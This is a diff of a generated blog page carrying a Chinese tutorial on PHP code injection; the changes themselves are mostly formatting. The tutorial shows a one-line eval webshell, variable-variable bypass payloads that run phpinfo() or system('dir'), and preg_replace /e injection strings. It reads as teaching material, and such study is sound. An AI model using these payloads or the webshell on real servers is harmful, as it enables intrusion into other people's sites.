@@ -79,7 +79,7 @@
     <div class="row">
         <div class="col-md-8 offset-md-2 ">
             <div class="post-content py-5 z-depth-3 main">
-                <h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做<code>PHP代码</code>执行。</p>
+                <h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做<code>PHP代码</code>执行。<br><a id="more"></a></p>
 <h2 id="常见php命令注入函数"><a href="#常见php命令注入函数" class="headerlink" title="常见php命令注入函数"></a>常见php命令注入函数</h2><p><code>eval()</code>，<code>assert()</code>, <code>system()</code>，<code>preg_replace()</code>,<code>create_function</code>, <code>call_user_func</code>,<code>call_user_func_array</code>，<code>array_map()</code>，<code>反引号</code>，<code>ob_start()</code>，<code>exec()</code>，<code>shell_exec()</code>，<code>passthru()</code>，<code>escapeshellcmd()</code>，<code>popen()</code>，<code>proc_open()</code>，<code>pcntl_exec()</code></p>
 <h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>这个函数我们在制作小马的时候经常用到：<code>&lt;?php  eval($_POST[&#39;aaa&#39;]); ?&gt;</code></p>
 <p><img src="https://s2.ax1x.com/2019/07/27/eMSDRP.png" alt="eval函数.png"></p>
@@ -97,20 +97,19 @@ $aa= @(string)$_GET[&quot;aa&quot;];
 eval(&#39;$aa=&quot;&#39; . addslashes($aa) . &#39;&quot;;&#39;);
 ?&gt;
 
-# ${${}} 绕过
-aa=${${phpinfo()}}
+# ${${} } 绕过
+aa=${${phpinfo()} }
 
 # 3 双引号包含过滤
 &lt;?php
 $aa= &quot;echo \&quot;hello &quot; . $_GET[&#39;aa&#39;] . &quot;\&quot;;&quot;;
 eval($aa);
 
-# ${${}} 绕过
-aa=${${phpinfo()}}
+# ${${} } 绕过
+aa=${${phpinfo()} }
 aa=${@system(&#39;dir&#39;)}
-
-`${${}} 绕过`是利用可变变量的二次嵌套，执行里面花括号内的代码，如: `echo &quot;${${phpinfo()}}&quot;;`, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。
-</code></pre><p>PHP可变变量可以无需二次嵌套，一次也可以执行，<code>echo &quot;${phpinfo()}&quot;;</code>这种情况是不能执行的，而<code>echo &quot;${/**/phpinfo()}&quot;;</code>是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，<code>空格，tab，注释，回车</code>是各种语法分析引擎中常见的分割字符，<code>@</code>是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。</p>
+</code></pre><p><code>${${} } 绕过</code>是利用可变变量的二次嵌套，执行里面花括号内的代码，如: <code>echo &quot;${${phpinfo()}}&quot;;</code>, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。</p>
+<p>PHP可变变量可以无需二次嵌套，一次也可以执行，<code>echo &quot;${phpinfo()}&quot;;</code>这种情况是不能执行的，而<code>echo &quot;${/**/phpinfo()}&quot;;</code>是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，<code>空格，tab，注释，回车</code>是各种语法分析引擎中常见的分割字符，<code>@</code>是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。</p>
 <p><strong>php &gt;= 4.3</strong></p>
 <pre><code>&quot;${ phpinfo()}&quot;;
 &quot;${    phpinfo()}&quot;;
@@ -186,17 +185,14 @@ foreach ($_GET as $regex =&gt; $value) {
     \1 表示分组1匹配的文本
 </code></pre><p><code>\\1</code>实际上就是<code>\1</code>，即第一个匹配项只需要控制匹配模式为<code>/(.*)/</code>，匹配出来的字符串为我们想要执行的代码，就可以了。</p>
 <p><strong>注意</strong></p>
-<pre><code>`preg_replace/e`只执行一次代码，即`strtolower`函数，所以我们必须想办法让输入的`phpinfo()`自己执行，这就涉及到了`php动态变量`，payload为`{${phpinfo()}}`，我们知道php变量名经过`{}`包裹后会将变量值输出,而这里`phpinfo`被`{}`包裹后会首先执行`phpinfo()`
-</code></pre><p>我们测试一下，</p>
+<p><code>preg_replace/e</code>只执行一次代码，即<code>strtolower</code>函数，所以我们必须想办法让输入的<code>phpinfo()</code>自己执行，这就涉及到了<code>php动态变量</code>，payload为<code>{${phpinfo()}}</code>，我们知道php变量名经过<code>{}</code>包裹后会将变量值输出,而这里<code>phpinfo</code>被<code>{}</code>包裹后会首先执行<code>phpinfo()</code></p>
+<p>我们测试一下，</p>
 <pre><code>&lt;?php
 preg_replace(&#39;/(.*)/ie&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,&#39;{${phpinfo()}}&#39;);
 ?&gt;
-</code></pre><p><img src="https://s2.ax1x.com/2019/07/29/e3QkQ0.png" alt=""><br>发现能够成功执行代码。</p>
-<pre><code>所以payload=`.*={${phpinfo()}}`
-
-但是没有成功执行`phpinfo()`代码，这是因为php的一个特性：php自身在解析请求时，如果参数中包含`. `这个字符，会将他转换为下划线。所以我们传递参数被解析为`_*={${phpinfo()}}`
-我们换个通用字符即可，因此payload:`\S*={${phpinfo()}}`
-</code></pre><p><img src="https://s2.ax1x.com/2019/07/29/e3360K.png" alt=""></p>
+</code></pre><p><img src="https://s2.ax1x.com/2019/07/29/e3QkQ0.png" alt=""><br>发现能够成功执行代码。<br>所以payload=<code>.*={${phpinfo()}}</code></p>
+<p>但是没有成功执行<code>phpinfo()</code>代码，这是因为php的一个特性：php自身在解析请求时，如果参数中包含<code>.</code>这个字符，会将他转换为下划线。所以我们传递参数被解析为<code>_*={${phpinfo()}}</code><br>我们换个通用字符即可，因此payload:<code>\S*={${phpinfo()}}</code></p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3360K.png" alt=""></p>
 <p>也可以执行命令：<br><img src="https://s2.ax1x.com/2019/07/29/e33IXt.png" alt=""></p>
 <h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>查阅php手册</p>
 <p><strong>string create_function ( string $args , string $code )</strong></p>
